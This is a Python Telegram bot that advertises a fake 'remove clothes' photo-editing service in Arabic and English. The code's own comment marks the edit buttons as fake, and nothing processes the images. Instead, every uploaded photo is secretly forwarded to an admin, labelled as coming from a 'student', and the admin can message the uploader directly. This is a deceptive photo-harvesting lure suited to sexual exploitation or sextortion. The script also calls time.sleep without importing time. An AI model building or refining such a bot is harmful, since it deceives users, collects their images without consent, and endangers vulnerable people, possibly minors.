import telebot
from telebot import types
import json
import os
from datetime import datetime
import threading

# 🔐 توكن البوت من متغير البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(BOT_TOKEN)

# 🔄 قاعدة بيانات بسيطة
DATA_FILE = "user_data.json"
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r") as f:
        user_data = json.load(f)
else:
    user_data = {}

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f)

# 🔁 تحديث عداد الصور يوميًا
def daily_reset():
    while True:
        now = datetime.utcnow().strftime("%Y-%m-%d")
        for uid in user_data:
            if user_data[uid].get("last_reset") != now:
                user_data[uid]["count"] = 0
                user_data[uid]["last_reset"] = now
        save_data()
        time.sleep(3600)

threading.Thread(target=daily_reset, daemon=True).start()

# 🧠 ربط صور الطلاب برسائل المشرف
student_lookup = {}

# ✅ رسالة البداية
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "👀 تخيّل صورتك تتعدّل بثواني…\n"
        "💋 تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "📸 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "👀 Imagine your photo transformed in seconds…\n"
        "💋 See it with no clothes, or with enhanced features.\n"
        "📸 Send a photo now... let’s get started.")

# ✅ التعامل مع الصور
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    uid = str(message.chat.id)
    if uid not in user_data:
        user_data[uid] = {"count": 0, "last_reset": ""}
    
    if user_data[uid]["count"] >= 3:
        bot.send_message(message.chat.id, "🚫 تجاوزت الحد المسموح (3 صور باليوم). جرب بكرا.")
        return
    
    user_data[uid]["count"] += 1
    save_data()

    # عرض خيارات وهمية
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞 / Remove Clothes", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه 💄 / Edit Face", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة 📸 / Enhance Photo", callback_data="quality"))

    bot.send_message(message.chat.id, "اختر نوع التعديل المطلوب:", reply_markup=markup)

    try:
        file_id = message.photo[-1].file_id
        caption = f"📥 صورة من الطالب: {message.from_user.first_name}"
        sent = bot.send_photo(ADMIN_ID, file_id, caption=caption)
        student_lookup[sent.message_id] = message.chat.id
    except Exception as e:
        print(f"خطأ في إرسال الصورة للمشرف: {e}")

# ✅ الرد من المشرف على صورة
@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and message.reply_to_message)
def reply_from_admin(message):
    replied_msg_id = message.reply_to_message.message_id
    student_id = student_lookup.get(replied_msg_id)

    if student_id:
        try:
            bot.send_message(student_id, f"📩 رسالة من المشرف:\n{message.text}")
            bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة للطالب.")
        except:
            bot.send_message(ADMIN_ID, "⚠️ فشل في إرسال الرسالة للطالب.")
    else:
        bot.send_message(ADMIN_ID, "⚠️ لا يوجد طالب مرتبط بهذه الصورة.")

# ✅ الرد اليدوي بأمر /رد
@bot.message_handler(commands=['رد'])
def manual_reply(message):
    if message.chat.id != ADMIN_ID:
        return

    try:
        args = message.text.split(" ", 2)
        if len(args) < 3:
            bot.send_message(ADMIN_ID, "❗ الصيغة:\n/رد student_id الرسالة")
            return

        student_id = int(args[1])
        reply_text = args[2]

        bot.send_message(student_id, f"📩 رسالة من المشرف:\n{reply_text}")
        bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة للطالب.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"⚠️ فشل في إرسال الرسالة:\n{e}")

# ✅ عند الضغط على أحد الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "nude":
        bot.send_message(call.message.chat.id, "✅ تم اختيار \"إزالة الملابس\"\nيرجى الانتظار..")
    elif call.data == "face":
        bot.send_message(call.message.chat.id, "✅ تم اختيار \"تعديل الوجه\"\nيرجى الانتظار..")
    elif call.data == "quality":
        bot.send_message(call.message.chat.id, "✅ تم اختيار \"تحسين الصورة\"\nيرجى الانتظار..")

# ✅ منع الرسائل النصية بدون صور
@bot.message_handler(content_types=['text'])
def handle_text(message):
    bot.send_message(message.chat.id, "⚠️ هذا البوت يقبل فقط الصور.\nPlease send a photo.")

print("✅ Bot is running...")
bot.polling()
